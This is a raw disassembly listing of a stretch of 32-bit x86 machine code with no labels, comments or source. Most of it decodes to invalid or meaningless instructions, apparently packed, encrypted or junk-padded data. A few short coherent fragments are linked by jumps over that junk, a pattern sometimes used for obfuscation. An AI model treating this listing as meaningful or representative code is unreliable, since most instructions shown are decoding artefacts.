  41c573:	xchg   DWORD PTR [ecx+esi*1-0x6ec3034],edi
  41c57a:	fidiv  WORD PTR [edi]
  41c57c:	loope  0x41c52c
  41c57e:	xchg   esp,eax
  41c57f:	cmp    eax,0x6a8c0984
  41c584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c585:	gs (bad) 
  41c587:	adc    al,0x0
  41c589:	fimul  WORD PTR [ebx]
  41c58b:	imul   esp,edx,0x41
  41c58e:	scas   al,BYTE PTR es:[edi]
  41c58f:	cmp    eax,DWORD PTR [ebx]
  41c591:	xor    eax,0x278d5862
  41c596:	push   eax
  41c597:	(bad)  
  41c598:	cmp    eax,0xdc99bc2b
  41c59d:	(bad)  
  41c59e:	(bad)  
  41c59f:	hlt    
  41c5a0:	int    0x7d
  41c5a2:	ss aaa 
  41c5a4:	jb     0x41c5bc
  41c5a6:	mov    eax,0xa6f5bf85
  41c5ab:	pop    ds
  41c5ac:	int    0xbf
  41c5ae:	cmp    al,bh
  41c5b0:	dec    esi
  41c5b1:	sahf   
  41c5b2:	mov    al,0xe
  41c5b4:	int3   
  41c5b5:	pop    esi
  41c5b6:	cmp    DWORD PTR [ebx-0x4cae001a],eax
  41c5bc:	and    eax,0xcd922d2e
  41c5c1:	ja     0x41c5ee
  41c5c3:	sbb    al,0xf8
  41c5c5:	leave  
  41c5c6:	or     al,0xf2
  41c5c8:	xchg   BYTE PTR [ecx+esi*8+0x39],ch
  41c5cc:	adc    bh,BYTE PTR [esi]
  41c5ce:	add    al,0x5b
  41c5d0:	js     0x41c577
  41c5d2:	int3   
  41c5d3:	gs adc al,0xa6
  41c5d6:	inc    ecx
  41c5d7:	pushf  
  41c5d8:	sbb    al,0xf6
  41c5da:	push   0x7f75675a
  41c5df:	call   0x140b:0xe5c53d46
  41c5e6:	xor    eax,0x56721f8
  41c5eb:	pusha  
  41c5ec:	push   edx
  41c5ed:	aas    
  41c5ee:	jb     0x41c5d4
  41c5f0:	jae    0x41c65d
  41c5f2:	adc    eax,0xcbe9fad1
  41c5f7:	inc    ecx
  41c5f8:	push   0x51a48fe5
  41c5fd:	js     0x41c5eb
  41c5ff:	dec    esp
  41c600:	arpl   cx,dx
  41c602:	les    ebx,FWORD PTR ds:0x93fb6742
  41c608:	in     al,dx
  41c609:	pop    esi
  41c60a:	loope  0x41c5c5
  41c60c:	mov    esp,0x5c4463cf
  41c611:	stos   DWORD PTR es:[edi],eax
  41c612:	xchg   ecx,eax
  41c613:	xor    BYTE PTR [esi],dl
  41c615:	fnstsw WORD PTR [eax+0x245e02d3]
  41c61b:	std    
  41c61c:	stos   DWORD PTR es:[edi],eax
  41c61d:	jmp    0x41c5e6
  41c61f:	data16 fimul WORD PTR [eax]
  41c622:	lahf   
  41c623:	dec    ecx
  41c624:	retf   0x91f7
  41c627:	test   DWORD PTR [edi],ecx
  41c629:	or     edx,DWORD PTR [ecx+0x5d]
  41c62c:	sbb    dl,BYTE PTR [eax+0x7eaedfd4]
  41c632:	lods   eax,DWORD PTR ds:[esi]
  41c633:	mov    al,ds:0xd7db4277
  41c638:	adc    ecx,0xbcf2662a
  41c63e:	fidiv  WORD PTR [edx-0x2b]
  41c641:	ror    BYTE PTR [esi-0x20c4bed7],0xd8
  41c648:	sub    dl,BYTE PTR [ebp+ecx*8-0x3a]
  41c64c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c64d:	pop    edx
  41c64e:	popa   
  41c64f:	dec    edi
  41c650:	ss push ebp
  41c652:	xchg   ebp,eax
  41c653:	push   ss
  41c654:	enter  0x6e09,0x7f
  41c658:	ss push edi
  41c65a:	lods   al,BYTE PTR ds:[esi]
  41c65b:	and    BYTE PTR [eax-0x59],ch
  41c65e:	pop    ecx
  41c65f:	scas   al,BYTE PTR es:[edi]
  41c660:	inc    esp
  41c661:	jge    0x41c6d4
  41c663:	or     cl,ch
  41c665:	and    al,BYTE PTR [ebx+edi*8+0x3c]
  41c669:	add    eax,0xb2ff8e7f
  41c66e:	push   es
  41c66f:	gs adc ecx,ecx
  41c672:	daa    
  41c673:	(bad)  
  41c674:	sbb    eax,ebx
  41c676:	add    al,0xdc
  41c678:	push   ss
  41c679:	sbb    BYTE PTR [edx-0x1ac7cacd],dh
  41c67f:	(bad)
  41c683:	sbb    al,0x96
  41c685:	rcr    al,0x33
  41c688:	fisttp DWORD PTR [ebp+0x1803f045]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0x4a6773e,eax
  41c6cc:	stc    
  41c6cd:	std    
  41c6ce:	add    cl,dh
  41c6d0:	jg     0x41c74a
  41c6d2:	adc    BYTE PTR [esi+0x78],bh
  41c6d5:	js     0x41c71f
  41c6d7:	mov    edi,0x52a64506
  41c6dc:	and    al,0x13
  41c6de:	cmp    DWORD PTR [edx],0x68
  41c6e1:	leave  
  41c6e2:	and    DWORD PTR [edx],esi
  41c6e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6e5:	xor    BYTE PTR [eax+0xaad5f82],0xd7
  41c6ec:	call   0x35449790
  41c6f1:	jo     0x41c69a
  41c6f3:	ret    
  41c6f4:	ret    
  41c6f5:	jo     0x41c6bd
  41c6f7:	sti    
  41c6f8:	push   esi
  41c6f9:	push   esp
  41c6fa:	xchg   DWORD PTR [edi+0x59],edi
  41c6fd:	xchg   ebx,eax
  41c6fe:	out    0x61,al
  41c700:	sbb    DWORD PTR [edx+0x2880ba88],0x37307847
  41c70a:	adc    eax,DWORD PTR [ecx]
  41c70c:	adc    edi,DWORD PTR [esi]
  41c70e:	adc    ebx,eax
  41c710:	rol    DWORD PTR [eax],1
  41c712:	mov    DWORD PTR [esi-0x3d],edi
  41c715:	mov    BYTE PTR [eax-0x2b],al
  41c718:	sar    DWORD PTR [eax-0x6bb9cb28],1
  41c71e:	mov    ds:0xdbd8fee0,al
  41c723:	out    0x6c,al
  41c725:	idiv   eax
  41c727:	dec    ebp
  41c728:	or     eax,0x5012331e
  41c72d:	stc    
  41c72e:	mov    eax,0x97eba496
  41c733:	sar    BYTE PTR [esi],0x14
  41c736:	popa   
  41c737:	test   edi,ecx
  41c739:	cmp    al,0x52
  41c73b:	into   
  41c73c:	outs   dx,DWORD PTR ds:[esi]
  41c73d:	xchg   ecx,eax
  41c73e:	and    BYTE PTR ds:0x19dc384d,bl
  41c744:	mov    esp,0x410e62c0
  41c749:	xor    al,0x8f
  41c74b:	jge    0x41c761
  41c74d:	sub    al,0x9f
  41c74f:	mov    bl,0xee
  41c751:	push   edx
  41c752:	(bad)  
  41c754:	addr16 or al,0x88
  41c757:	push   es
  41c758:	xchg   esp,eax
  41c759:	mov    ebx,0x479a87df
  41c75e:	mov    esi,?
  41c760:	jecxz  0x41c6f1
  41c762:	loope  0x41c7b2
  41c764:	js     0x41c76e
  41c766:	fdivr  QWORD PTR [ecx-0x42]
  41c769:	xchg   ebp,eax
  41c76a:	sub    dl,BYTE PTR [eax]
  41c76c:	(bad)  
  41c76d:	cmp    eax,0xd5ea92a8
  41c772:	lods   al,BYTE PTR ds:[esi]
  41c773:	test   DWORD PTR [ecx-0x55438835],edx
  41c779:	and    ebx,edi
  41c77b:	getsec 
  41c77d:	pushf  
  41c77e:	adc    al,0x49
  41c780:	pushw  0xa69b
  41c784:	fmul   QWORD PTR [edi]
  41c786:	jp     0x41c717
  41c788:	sub    BYTE PTR ds:0x3296b956,0x1b
  41c78f:	jno    0x41c75d
  41c791:	mov    ds:0x18f875c7,eax
  41c796:	mov    cl,0x8d
  41c798:	call   0x9c6:0x38d4455
  41c79f:	test   DWORD PTR [esp+eax*8-0x7a],edx
  41c7a3:	aaa    
  41c7a4:	sub    edx,edi
  41c7a6:	inc    esi
  41c7a7:	xchg   al,dh
  41c7a9:	ds test edx,ebp
  41c7ac:	mov    esp,0x810d1920
  41c7b1:	sti    
  41c7b2:	sub    BYTE PTR [ecx-0xf],ah
  41c7b5:	push   ds
  41c7b6:	mov    al,0xb6
  41c7b8:	jl     0x41c7c3
  41c7ba:	mov    eax,ds:0x67cd035a
  41c7bf:	(bad)  
  41c7c1:	pop    esi
  41c7c2:	paddsw mm6,QWORD PTR [ebx+0x62dd392e]
  41c7c9:	bound  esi,QWORD PTR [ebp+0x78]
  41c7cc:	fistp  QWORD PTR ss:[edx-0x78f366b2]
  41c7d3:	push   ebp
  41c7d4:	int    0x16
  41c7d6:	xlat   BYTE PTR ds:[ebx]
  41c7d7:	rcl    edx,1
  41c7d9:	out    dx,eax
  41c7da:	(bad)
  41c7dd:	dec    edx
  41c7de:	jp     0x41c78c
  41c7e0:	mov    BYTE PTR [ebx-0x13],cl
  41c7e3:	xor    edi,DWORD PTR [ecx]
  41c7e5:	sbb    BYTE PTR [ebx],dh
  41c7e7:	xchg   ecx,eax
  41c7e8:	aaa    
  41c7e9:	inc    ecx
  41c7ea:	jle    0x41c824
  41c7ec:	xchg   edi,eax
  41c7ed:	dec    eax
  41c7ee:	(bad)  
  41c7ef:	lods   al,BYTE PTR ds:[esi]
  41c7f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7f1:	sub    ebp,eax
  41c7f3:	aam    0x97
  41c7f5:	sbb    al,0xae
  41c7f7:	dec    ecx
  41c7f8:	test   eax,0x207de181
  41c7fd:	mov    esp,0x6cfd7f9a
  41c802:	rcr    BYTE PTR [edx+0x6ba46597],0x45
  41c809:	fs sub eax,0xa838b69
  41c80f:	cmp    BYTE PTR [ebp+0x6d385286],0x2d
  41c816:	sbb    ebp,0xffffffa3
  41c819:	lock push ebp
  41c81b:	push   esp
  41c81c:	xor    edx,DWORD PTR [edx-0x72c7156f]
  41c822:	arpl   WORD PTR [edi],dx
  41c824:	pop    ss
  41c825:	dec    sp
  41c827:	es call 0x1738daba
  41c82d:	push   ds
  41c82e:	jle    0x41c855
  41c830:	mov    ds:0xb7ac650e,al
  41c835:	jge    0x41c80b
  41c837:	je     0x41c82b
  41c839:	test   eax,0xe11044c4
  41c83e:	inc    ebx
  41c83f:	test   eax,0x1e84c421
  41c844:	popf   
  41c845:	ret    0x5b2f
  41c848:	and    ch,cl
  41c84a:	(bad)  
  41c84c:	cmp    ecx,DWORD PTR [edi]
  41c84e:	jnp    0x41c7f3
  41c850:	enter  0x17f6,0x84
  41c854:	mov    edx,0xa7d2dc01
  41c859:	mov    WORD PTR [ebx-0x285e8308],gs
  41c85f:	sbb    eax,0x9fa6887
  41c864:	(bad)  
  41c865:	das    
  41c866:	xchg   ecx,eax
  41c867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c868:	fwait
  41c869:	addr16 xor eax,0x68cdc994
  41c86f:	das    
  41c870:	int    0x9e
  41c872:	mov    ds:0x45864469,eax
  41c877:	popf   
  41c878:	shl    DWORD PTR ss:[esi-0x3866bb3],cl
  41c87f:	pop    ebp
  41c880:	inc    eax
  41c881:	dec    ebp
  41c882:	pushf  
  41c883:	dec    ebp
  41c884:	aam    0x9c
  41c886:	call   0x9eb2:0xf0783e9a
  41c88d:	icebp  
  41c88e:	mov    ecx,0x1be7d49d
  41c893:	push   ebx
  41c894:	jmp    0x41c8e1
  41c896:	push   ebp
  41c897:	or     eax,0xad233d6b
  41c89c:	xchg   ebx,eax
  41c89d:	inc    ebp
  41c89e:	inc    edx
  41c89f:	cmp    DWORD PTR [edi+0x4542172e],0x6b
  41c8a6:	repnz xor eax,0xd22c179e
  41c8ac:	push   cs
  41c8ad:	sbb    BYTE PTR [eax+ebx*1-0x3b],dl
  41c8b1:	cmp    ch,BYTE PTR [ebx]
  41c8b3:	jge    0x41c908
  41c8b5:	adc    ebx,DWORD PTR [eax-0x17]
  41c8b8:	inc    esp
  41c8ba:	cmp    eax,DWORD PTR [edi+ebx*8-0x2f]
  41c8be:	clc    
  41c8bf:	and    eax,0x320e2e6a
  41c8c4:	and    BYTE PTR [ebx],cl
  41c8c6:	cmp    DWORD PTR [eax+ebp*2-0x77fc0251],esp
  41c8cd:	inc    esi
  41c8ce:	lods   al,BYTE PTR ds:[esi]
  41c8cf:	ror    eax,0xea
  41c8d2:	mov    bh,0xdb
  41c8d4:	inc    ebx
  41c8d5:	xor    DWORD PTR [ebx+0xa],ecx
  41c8d8:	or     edi,DWORD PTR [ebp+0x6a]
  41c8db:	pushf  
  41c8dc:	dec    BYTE PTR [edx]
  41c8de:	xor    cl,BYTE PTR [ebx]
  41c8e0:	ins    DWORD PTR es:[edi],dx
  41c8e1:	(bad)  
  41c8e2:	inc    ebp
  41c8e3:	adc    al,BYTE PTR [ebp+0x5fa6e299]
  41c8e9:	add    eax,0xb584518d
  41c8ee:	dec    edx
  41c8ef:	inc    ebx
  41c8f0:	add    ebx,DWORD PTR [edx+ebx*1]
  41c8f3:	dec    ebx
  41c8f4:	xor    edx,edx
  41c8f6:	add    DWORD PTR [ebp-0xc],ebx
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	jmp    0x41c8dd
  41c911:	sti    
  41c912:	sahf   
  41c913:	sbb    bh,dh
  41c915:	jg     0x41c98f
  41c917:	adc    BYTE PTR [esi+0x78],bh
  41c91a:	js     0x41c8c6
  41c91c:	aas    
  41c91d:	stos   DWORD PTR es:[edi],eax
  41c91e:	and    al,BYTE PTR [ebx-0x53]
  41c921:	out    0x21,al
  41c923:	fdivr  DWORD PTR [edi+ebx*2]
  41c926:	jo     0x41c950
  41c928:	das    
  41c929:	and    esi,ecx
  41c92b:	sbb    esp,DWORD PTR [eax+0x41dac11e]
  41c931:	outs   dx,DWORD PTR ds:[esi]
  41c932:	add    bl,BYTE PTR [ecx+0x3bf8a6d4]
  41c938:	fcom   DWORD PTR [ebx-0x80529df]
  41c93e:	adc    esp,0xffffff9a
  41c941:	iret   
  41c942:	xor    DWORD PTR [ebx-0x3b],ebp
  41c945:	cli    
  41c946:	int    0xa
  41c948:	pop    esp
  41c949:	mov    ah,BYTE PTR [ebp+edi*8-0xd]
  41c94d:	mov    ah,BYTE PTR [edx]
  41c94f:	cmp    BYTE PTR [edx+0x9b389e],bl
  41c955:	inc    BYTE PTR [ebp-0x2ea77cdf]
  41c95b:	ret    
  41c95c:	mov    ebp,0xaa42a023
  41c961:	cmp    BYTE PTR [eax+esi*4],dh
  41c964:	sub    al,0xfd
  41c966:	or     BYTE PTR [ebp+0x37],ch
  41c969:	loope  0x41c90f
  41c96b:	bound  ecx,QWORD PTR [edi-0xdbd69c4]
  41c971:	stos   DWORD PTR es:[edi],eax
  41c972:	test   DWORD PTR [esi+0x3],eax
  41c975:	scas   eax,DWORD PTR es:[edi]
  41c976:	dec    DWORD PTR [esi-0x66]
  41c979:	out    0x37,al
  41c97b:	mov    ecx,0x293373b0
  41c980:	cmp    bl,BYTE PTR [esi-0x68a6c57b]
  41c986:	loop   0x41c978
  41c988:	and    eax,0x8080fd44
  41c98d:	loop   0x41c9c4
  41c98f:	adc    DWORD PTR [ebp+0x3c],0x13dde880
  41c996:	dec    ecx
  41c997:	mov    bh,0x82
  41c999:	data16 sar BYTE PTR [esi],cl
  41c99c:	xor    eax,0x3e80443d
  41c9a1:	bound  ebp,QWORD PTR [edi]
  41c9a3:	loopne 0x41c9cd
  41c9a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9a6:	mov    BYTE PTR [esi-0x30],ah
  41c9a9:	or     edi,ecx
  41c9ab:	lds    esi,FWORD PTR [edx]
  41c9ad:	xchg   edx,eax
  41c9ae:	(bad)  
  41c9af:	rcr    BYTE PTR [ecx-0x75],1
  41c9b2:	test   al,ah
  41c9b4:	mov    dh,0xf
  41c9b6:	ror    ah,cl
  41c9b8:	pop    ds
  41c9b9:	fcmovne st,st(2)
  41c9bb:	call   0x2a2bf191
  41c9c0:	leave  
  41c9c1:	adc    edi,DWORD PTR [edi]
  41c9c3:	cmp    esi,DWORD PTR [ebp-0x70]
  41c9c6:	test   BYTE PTR [eax],cl
  41c9c8:	xor    al,0xf8
  41c9ca:	mov    edx,0xfaefc0b9
  41c9cf:	(bad)  
  41c9d0:	dec    ebx
  41c9d1:	fdivr  st,st(6)
  41c9d3:	imul   ecx,DWORD PTR [ebx],0xffffffb7
  41c9d6:	mov    WORD PTR [eax+0x18],gs
  41c9d9:	mov    ebp,DWORD PTR [ebx]
  41c9db:	aaa    
  41c9dc:	adc    al,0x3d
  41c9de:	jo     0x41c9a1
  41c9e0:	popa   
  41c9e1:	xor    edx,DWORD PTR [esi]
  41c9e3:	dec    BYTE PTR [eax]
  41c9e5:	pop    ecx
  41c9e6:	or     al,0xc8
  41c9e8:	inc    edi
  41c9e9:	ds push ebx
  41c9eb:	leave  
  41c9ec:	iret   
  41c9ed:	hlt    
  41c9ee:	xchg   esi,eax
  41c9ef:	out    0x1c,al
  41c9f1:	pop    esp
  41c9f2:	jmp    0xf9e7947e
  41c9f7:	cmp    BYTE PTR [ebx-0x4b],0xa0
  41c9fb:	data16 adc ah,bh
  41c9fe:	xor    DWORD PTR [edx+esi*1-0x62d223ef],ebx
  41ca05:	adc    edx,DWORD PTR [eax+0x51]
  41ca08:	les    esp,FWORD PTR [eax]
  41ca0a:	mov    bh,BYTE PTR [ebx+ebx*4]
  41ca0d:	in     al,dx
  41ca0e:	pop    es
  41ca0f:	test   DWORD PTR [ecx-0x1a2668f],ebp
  41ca15:	push   eax
  41ca16:	cmp    ebp,edi
  41ca18:	xor    bh,dh
  41ca1a:	out    dx,eax
  41ca1b:	retf   0xb60f
  41ca1e:	mov    al,ss:0x8dbab8ea
  41ca24:	sbb    eax,0x6f337fcd
  41ca29:	call   0x7fec:0x2068d72a
  41ca30:	xor    DWORD PTR [edx-0x22],esp
  41ca33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca34:	dec    ebx
  41ca35:	ficomp WORD PTR fs:[ecx+ebx*4]
  41ca39:	sbb    ecx,DWORD PTR [ebp+0x5a]
  41ca3c:	mov    esp,?
  41ca3e:	gs aad 0x84
  41ca41:	mov    dl,0x96
  41ca43:	ins    BYTE PTR es:[edi],dx
  41ca44:	sub    ah,BYTE PTR [ecx+0xc]
  41ca47:	add    al,0x91
  41ca49:	ins    DWORD PTR es:[edi],dx
  41ca4a:	pusha  
  41ca4b:	fadd   QWORD PTR [ebp-0x4a]
  41ca4e:	add    BYTE PTR [eax+0x55b1936d],bl
  41ca54:	in     al,dx
  41ca55:	inc    ebx
  41ca56:	test   DWORD PTR [ebx+0x31],0x816b6203
  41ca5d:	stc    
  41ca5e:	and    DWORD PTR [ebx+0x65],0x34e5265f
  41ca65:	fcom   st(7)
  41ca67:	fwait
  41ca68:	mov    edi,0xb66a0f8
  41ca6d:	jnp    0x41ca94
  41ca6f:	add    eax,0x5c48996a
  41ca74:	fstp   QWORD PTR [eax+0x71]
  41ca77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca78:	and    al,0x52
  41ca7a:	dec    eax
  41ca7b:	fwait
  41ca7c:	adc    al,0x2b
  41ca7e:	mov    ch,0x65
  41ca80:	sbb    esi,DWORD PTR es:[edi+esi*2+0x67]
  41ca85:	sub    BYTE PTR [ecx-0x15f502b2],cl
  41ca8b:	jnp    0x41cae1
  41ca8d:	loope  0x41ca1c
  41ca8f:	das    
  41ca90:	dec    eax
  41ca91:	and    ebp,esp
  41ca93:	and    eax,0xd53036d7
  41ca98:	icebp  
  41ca99:	shl    ebx,cl
  41ca9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca9c:	adc    edx,esp
  41ca9e:	test   al,0xb3
  41caa0:	and    BYTE PTR [esi-0x4e6f4681],bl
  41caa6:	repnz lock inc ecx
  41caa9:	jbe    0x41cabd
  41caab:	mov    dh,0xf9
  41caad:	test   BYTE PTR [ebp-0x17343158],0x91
  41cab4:	cwde   
  41cab5:	loopne 0x41cafa
  41cab7:	xchg   ebx,eax
  41cab8:	xor    DWORD PTR [eax+0x1],eax
  41cabb:	pop    esi
  41cabc:	xor    eax,ecx
  41cabe:	push   eax
  41cabf:	stc    
  41cac0:	pop    edi
  41cac1:	mov    BYTE PTR [ebp-0x42],cl
  41cac4:	ins    BYTE PTR es:[edi],dx
  41cac5:	cdq    
  41cac6:	add    DWORD PTR [ebx+0x79068c4a],ebp
  41cacc:	arpl   WORD PTR [edi],cx
  41cace:	mov    ch,0x88
  41cad0:	mov    edx,DWORD PTR [ebp-0x3e]
  41cad3:	das    
  41cad4:	cmp    eax,0x2322f5b2
  41cad9:	iret   
  41cada:	stc    
  41cadb:	xchg   ecx,esi
  41cadd:	dec    ebx
  41cade:	das    
  41cadf:	lock into 
  41cae1:	mov    eax,0xe8fab293
  41cae6:	jb     0x41cab9
  41cae8:	pop    edx
  41cae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caea:	kmovw  k0,WORD PTR [esi]
  41caee:	sub    ch,ch
  41caf0:	icebp  
  41caf1:	scas   eax,DWORD PTR es:[edi]
  41caf2:	ret    
  41caf3:	ja     0x41caa9
  41caf5:	sub    eax,0x822129b9
  41cafa:	dec    ecx
  41cafb:	les    esi,FWORD PTR [ecx+0x7b6ca0ca]
  41cb01:	rcr    DWORD PTR [edi-0x4c6efd81],0x6c
  41cb08:	pop    edx
  41cb09:	fldenv [esi+0x26]
  41cb0c:	fbstp  TBYTE PTR [ecx+ebx*1]
  41cb0f:	js     0x41cb0a
  41cb11:	xor    esp,DWORD PTR [ecx+0x9d41b77]
  41cb17:	dec    DWORD PTR [eax-0x19]
  41cb1a:	sti    
  41cb1b:	or     ecx,DWORD PTR [ebp+0x19e27284]
  41cb21:	adc    ah,BYTE PTR [edi+0x188a3e05]
  41cb27:	cmc    
  41cb28:	cmp    cl,BYTE PTR [ecx]
  41cb2a:	fist   WORD PTR [ebp-0x6b769a52]
  41cb30:	xchg   ebx,eax
  41cb31:	std    
  41cb32:	push   es
  41cb33:	pop    esi
  41cb34:	jmp    0x41cd69
  41cb39:	into   
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0x4b986037
  41cb47:	push   eax
  41cb48:	and    esi,DWORD PTR [eax]
  41cb4a:	cmc    
  41cb4b:	jg     0x41cbc5
  41cb4d:	adc    BYTE PTR [esi+0x78],bh
  41cb50:	js     0x41cb8b
  41cb52:	and    al,0x9d
  41cb54:	dec    ebx
  41cb55:	xchg   cl,bh
  41cb57:	sub    BYTE PTR [eax+0x48b2b91a],ch
  41cb5d:	out    0x46,al
  41cb5f:	je     0x41caef
  41cb61:	retf   
  41cb62:	xchg   DWORD PTR [esi],edi
  41cb64:	pop    ss
  41cb65:	mov    edi,0xe1672cea
  41cb6a:	push   edx
  41cb6b:	xor    dh,BYTE PTR [esi]
  41cb6d:	push   ecx
  41cb6e:	sbb    al,0xcf
  41cb70:	jbe    0x41cb9a
  41cb72:	hlt    
  41cb73:	sti    
  41cb74:	xor    esp,DWORD PTR [ebx-0x4bc28975]
  41cb7a:	into   
  41cb7b:	jecxz  0x41cb27
  41cb7d:	loop   0x41cbce
  41cb7f:	jbe    0x41cb95
  41cb81:	jno    0x41cb8e
  41cb83:	sub    DWORD PTR cs:[esi+0x12],ebx
  41cb87:	sub    ah,dl
  41cb89:	adc    DWORD PTR [edx-0x5622facf],0x7e68ce5a
  41cb93:	aas    
  41cb94:	and    edi,DWORD PTR [esp+ebp*1]
  41cb97:	lahf   
  41cb98:	xor    dh,BYTE PTR [edi]
  41cb9a:	sub    ebx,DWORD PTR [esi+0x6fdfeae2]
  41cba0:	jns    0x41cb25
  41cba2:	jecxz  0x41cbb8
  41cba4:	lock mov al,ds:0xfa672597
  41cbaa:	sub    BYTE PTR [ecx-0x16],cl
  41cbad:	enter  0xeb8c,0x85
  41cbb1:	xchg   edx,eax
  41cbb2:	push   ebp
  41cbb3:	sub    dh,BYTE PTR [edi-0x71]
  41cbb6:	cmp    eax,0xd5aab410
  41cbbb:	xor    ebp,edx
  41cbbd:	popa   
  41cbbe:	inc    esi
  41cbbf:	cmp    esi,edx
  41cbc1:	add    esi,DWORD PTR [edi]
  41cbc3:	jge    0x41cbe0
  41cbc5:	add    al,BYTE PTR [edi+ecx*2]
  41cbc8:	xor    BYTE PTR [esi-0x10d99095],0x1c
  41cbcf:	xlat   BYTE PTR ds:[ebx]
  41cbd0:	fimul  DWORD PTR [edx-0x1cf48323]
  41cbd6:	rcr    al,0x74
  41cbd9:	mov    dh,0xa4
  41cbdb:	or     ebp,DWORD PTR ds:0x3469666b
  41cbe1:	and    eax,0x4062963b
  41cbe6:	sub    al,0xcf
  41cbe8:	jg     0x41cc43
  41cbea:	out    dx,al
  41cbeb:	in     al,dx
  41cbec:	jne    0x41cc25
  41cbee:	repnz or eax,0x8c36f658
  41cbf4:	das    
  41cbf5:	pop    ebx
  41cbf6:	cmp    BYTE PTR [ecx],dl
  41cbf8:	dec    esi
  41cbf9:	(bad)  
  41cbfa:	das    
  41cbfb:	out    dx,al
  41cbfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbfd:	mov    dl,0x78
  41cbff:	idiv   BYTE PTR [ebx+edi*8]
  41cc02:	xlat   BYTE PTR ds:[ebx]
  41cc03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc04:	shl    dl,1
  41cc06:	ror    ch,cl
  41cc08:	mov    esi,0x9b2a7a74
  41cc0d:	jnp    0x41cbba
  41cc0f:	xchg   esp,eax
  41cc10:	mov    cl,BYTE PTR [edi-0x5b]
  41cc13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc14:	scas   al,BYTE PTR es:[edi]
  41cc15:	add    DWORD PTR [esi],0xffffffda
  41cc18:	cs adc eax,ecx
  41cc1b:	dec    edi
  41cc1c:	cli    
  41cc1d:	fcom   st(2)
  41cc1f:	mov    BYTE PTR [edx+0x395685c0],ch
  41cc25:	mov    ch,0x85
  41cc27:	mov    ch,0x6a
  41cc29:	xchg   ebp,eax
  41cc2a:	jecxz  0x41cc2b
  41cc2c:	and    al,BYTE PTR [ebx]
  41cc2e:	push   esp
  41cc2f:	das    
  41cc30:	xchg   esi,eax
  41cc31:	xor    DWORD PTR [ebp-0x4],ebp
  41cc34:	adc    BYTE PTR [esi+0x6f],bh
  41cc37:	pop    ebp
  41cc38:	jae    0x41cc8e
  41cc3a:	push   ss
  41cc3b:	xor    eax,0xc6401041
  41cc40:	(bad)  
  41cc41:	stc    
  41cc42:	push   ds
  41cc43:	push   0xffffffc9
  41cc45:	add    al,0xad
  41cc47:	xor    al,0x8b
  41cc49:	push   ebp
  41cc4a:	popa   
  41cc4b:	add    BYTE PTR [ebx-0x3c],dh
  41cc4e:	sahf   
  41cc4f:	enter  0x786d,0x32
  41cc53:	fs adc eax,0x388c0b71
  41cc59:	popf   
  41cc5a:	pop    esi
  41cc5b:	cmp    BYTE PTR [eax],bl
  41cc5d:	std    
  41cc5e:	call   FWORD PTR [eax+ebp*2]
  41cc61:	fprem  
  41cc63:	mov    ch,0x89
  41cc65:	push   esi
  41cc66:	add    al,0x47
  41cc68:	and    dl,BYTE PTR [edx+0x46]
  41cc6b:	sbb    ecx,edx
  41cc6d:	bnd jp 0x41cc13
  41cc70:	cwde   
  41cc71:	cli    
  41cc72:	cwde   
  41cc73:	hlt    
  41cc74:	test   dh,dl
  41cc76:	mov    ds:0xc4cbcc4,eax
  41cc7b:	sub    eax,DWORD PTR [ebx-0x79e90b83]
  41cc81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc82:	(bad)  
  41cc84:	ss adc ebp,DWORD PTR ds:[ebp+0xf951a1b]
  41cc8c:	sub    BYTE PTR [eax-0x1b],dh
  41cc8f:	les    edx,FWORD PTR [esi-0x5a0dbd8a]
  41cc95:	les    edx,FWORD PTR [ebp-0x18]
  41cc98:	push   ebx
  41cc99:	fisttp WORD PTR [ecx+0x2cec2482]
  41cc9f:	out    0xa,al
  41cca1:	adc    DWORD PTR [esi-0x69bb642],eax
  41cca7:	test   DWORD PTR [ecx],edx
  41cca9:	and    al,0x6a
  41ccab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccac:	std    
  41ccad:	xchg   eax,ebx
  41ccaf:	lods   eax,DWORD PTR ds:[esi]
  41ccb0:	jmp    0x2ce1:0x3f696b57
  41ccb7:	xor    edi,ebx
  41ccb9:	push   ebp
  41ccba:	popf   
  41ccbb:	xchg   edx,eax
  41ccbc:	cwde   
  41ccbd:	add    ebx,DWORD PTR [edx]
